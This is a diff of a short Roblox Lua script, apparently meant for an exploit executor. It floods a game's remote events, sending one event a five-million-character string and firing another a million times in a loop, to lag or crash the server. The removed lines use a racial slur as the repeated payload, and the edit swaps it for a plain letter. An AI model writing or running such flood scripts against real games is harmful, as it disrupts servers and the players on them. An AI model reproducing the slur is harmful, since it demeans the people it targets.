@@ -1,12 +1,9 @@
 local RS = game:GetService("ReplicatedStorage")
-local Event1 = RS:WaitForChild("DataEvents"):WaitForChild("UpdateTexturesChoice")
-    Event1:FireServer(("nigga"):rep(5e6))
 
-    task.wait()
+local UpdTextures = RS.DataEvents.UpdateTexturesChoice
+UpdTextures:FireServer(string.rep("A", 5e6))
 
-    local Event = RS:WaitForChild("DataEvents"):WaitForChild("DataRemoteEvent")
-    Event:FireServer(("nigga"):rep(1))
-
-    for i = 1, 1e6 do
-        Event:FireServer()
-    end
+local DataRemote = RS.DataEvents.DataRemoteEvent
+for _ = 1, 1e6 do
+    DataRemote:FireServer()
+end
